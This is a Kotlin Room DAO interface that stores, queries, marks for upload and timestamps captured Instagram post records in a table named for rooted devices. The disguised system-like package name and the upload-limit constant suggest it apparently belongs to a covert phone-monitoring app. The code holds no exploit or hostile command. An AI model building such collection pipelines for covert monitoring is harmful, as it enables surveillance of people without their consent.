package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.InstagramPostRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface InstagramPostRooedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(instagram_feed: List<InstagramPostRooted>)

    @Query("Select * from instagram_post_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllInstagramFeedMessages(status: Int): List<InstagramPostRooted>

    @Query("Update instagram_post_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from instagram_post_rooted")
    fun selectMaxTimeStamp(): Long
}